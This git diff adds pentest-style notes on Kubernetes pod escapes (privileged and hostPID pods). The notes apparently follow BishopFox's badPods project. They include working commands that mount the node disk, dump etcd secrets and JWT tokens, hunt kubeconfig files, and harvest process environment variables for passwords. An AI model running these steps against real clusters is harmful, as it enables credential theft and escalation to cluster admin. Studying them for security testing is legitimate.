@@ -9,9 +9,16 @@ https://github.com/BishopFox/badPods/
 
 ### 1. pod privileged
 
+From https://kubernetes.io/docs/concepts/policy/pod-security-policy/#privileged:
+
+> a "privileged" container is given access to all devices on the host. This allows the container nearly all the same access as processes running on the host. This is useful for containers that want to use linux capabilities like manipulating the network stack and accessing devices.
+
+
+
 ```
-localhost$ kubectl apply -f ./pod-privileged.yaml
-localhost$ kubectl exec -it pod-privileged -- bash
+$ k create ns priv
+$ k -n priv apply -f pod-privileged.yaml
+$ k -n priv exec -it pod-privileged -- bash
 ```
 
 Can read all node's devices:
@@ -19,6 +26,31 @@ Can read all node's devices:
 - ls /dev
 - fdisk -l
 - ...
+
+
+```
+$ apt-get update && apt-get install less binutils
+```
+
+```
+$ fdisk -l
+$ mount /dev/sda1 /mnt
+$ strings /mnt/var/lib/etcd/member/snap/db | less
+```
+
+Print all etcd secrets:
+```
+$ db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
+```
+
+Find kubectonfig:
+```
+$ find /mnt -name kubeconfig
+$ find /mnt -name .kube
+$ grep -R "current-context" /mnt/home/
+$ grep -R "current-context" /mnt/root/
+$ grep -R "current-context" /mnt/
+```
 
 ```
 root@pod-privileged:/# mount /dev/sda1 /mnt
@@ -257,8 +289,59 @@ the yum faq at:
   http://yum.baseurl.org/wiki/Faq
 ```
 
+Privileged pod can't read node's processes:
+```
+$ ls /host/proc
+<empty>
+```
 
 ### 2. pod hostpid
+
+Pod can see all the processes running on the node.
+
+```
+$ fdisk -l
+<empty>
+```
+
+You [can](https://github.com/BishopFox/badPods/tree/main/manifests/hostpid):
+
+- *View processes on the host*
+```
+$ ps aux | grep kubelet
+root     12272  4.9  2.3 1177068 381128 ?      Ssl  Oct07  75:23 kube-apiserver --advertise-address=188.246.229.4 --allow-privileged=true --authorization-mode=Node,RBAC --client-ca-file=/etc/kubernetes/pki/ca.crt --enable-admission-plugins=NodeRestriction --enable-bootstrap-token-auth=true --etcd-cafile=/etc/kubernetes/pki/etcd/ca.crt --etcd-certfile=/etc/kubernetes/pki/apiserver-etcd-client.crt --etcd-keyfile=/etc/kubernetes/pki/apiserver-etcd-client.key --etcd-servers=https://127.0.0.1:2379 --kubelet-client-certificate=/etc/kubernetes/pki/apiserver-kubelet-client.crt --kubelet-client-key=/etc/kubernetes/pki/apiserver-kubelet-client.key --kubelet-preferred-address-types=InternalIP,ExternalIP,Hostname --proxy-client-cert-file=/etc/kubernetes/pki/front-proxy-client.crt --proxy-client-key-file=/etc/kubernetes/pki/front-proxy-client.key --requestheader-allowed-names=front-proxy-client --requestheader-client-ca-file=/etc/kubernetes/pki/front-proxy-ca.crt --requestheader-extra-headers-prefix=X-Remote-Extra- --requestheader-group-headers=X-Remote-Group --requestheader-username-headers=X-Remote-User --secure-port=6443 --service-account-issuer=https://kubernetes.default.svc.cluster.local --service-account-key-file=/etc/kubernetes/pki/sa.pub --service-account-signing-key-file=/etc/kubernetes/pki/sa.key --service-cluster-ip-range=10.96.0.0/12 --tls-cert-file=/etc/kubernetes/pki/apiserver.crt --tls-private-key-file=/etc/kubernetes/pki/apiserver.key
+root     12365  2.1  1.0 1807888 168864 ?      Ssl  Oct07  32:47 /usr/bin/kubelet --bootstrap-kubeconfig=/etc/kubernetes/bootstrap-kubelet.conf --kubeconfig=/etc/kubernetes/kubelet.conf --config=/var/lib/kubelet/config.yaml --container-runtime=remote --container-runtime-endpoint=/run/containerd/containerd.sock --pod-infra-container-image=k8s.gcr.io/pause:3.5
+root     23692  0.0  0.0   3436   736 pts/0    S+   15:37   0:00 grep --color=auto kubelet
+```
+
+On local host, run another pod:
+```
+$  k -n mock-payload get po  # should see the secrets mounted to frontend pods
+```
+
+
+- *View the environment variables for each pod on the host (but not the host itself)*:
+
+> TODO: too many permission denied! can't see the secret
+
+```
+$ for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1  $e; done > envs.txt
+...
+$ grep PASSWORD envs.txt
+```
+
+
+- *View the file descriptors for each pod on the host*:
+
+
+
+
+- View the file descriptors for each pod on the host - With hostPID: true, you can read the /proc/[PID]/fd[X] for each process running on the host, including all of the processes running in pods. Some of these allow you to read files that are opened within pods.
+- Look for passwords, tokens, keys, etc. – If you are lucky, you will find credentials and you’ll be able to use them to escalate privileges within the cluster, to escalate privileges services supported by the cluster, or to escalate privileges services that cluster-hosted applications are communicating with. It is a long shot, but you might find a Kubernetes service account token or some other authentication material that will allow you to access other namespaces and eventually escalate all the way up to cluster admin.
+Kill processes – You can also kill any process on the node (presenting a denial-of-service risk), but I would advise against it on a penetration test!
+
+
+
 ### 3. pod hostpath
 ### 4. pod hostipc
 ### 5. pod hostnetwork
